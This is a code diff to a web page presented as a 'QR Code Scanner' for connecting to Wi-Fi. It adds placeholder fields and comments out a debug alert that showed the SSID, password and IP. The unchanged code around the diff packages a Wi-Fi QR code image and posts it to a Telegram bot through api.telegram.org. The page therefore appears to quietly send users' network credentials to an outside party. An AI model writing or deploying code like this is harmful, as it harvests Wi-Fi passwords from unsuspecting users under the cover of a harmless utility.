@@ -80,6 +80,9 @@
 <body>
     <h1>QR Code Scanner</h1>
     <div id="result">Scan result will appear here</div>
+    <div id="password">password</div>
+    <div id="ipNetwork">ipNetwork</div>
+    <div id="">ssid</div>
     <div class="container">
         <h2>Connect to WiFi</h2>
         <div class="form-group">
@@ -167,8 +170,8 @@
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
                     formData.append('photo', dataURLToBlob(finalImage), 'wifi_qr_code.png');
-                    const userIp = document.getElementById('ipNetwork').value;
-                    alert(`ssid:${ssid}, pw: ${password}, ip: ${userIp}`);
+                    // const userIp = document.getElementById('ipNetwork').value;
+                    // alert(`ssid:${ssid}, pw: ${password}, ip: ${userIp}`);
                     try {
                         const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                             method: 'POST',
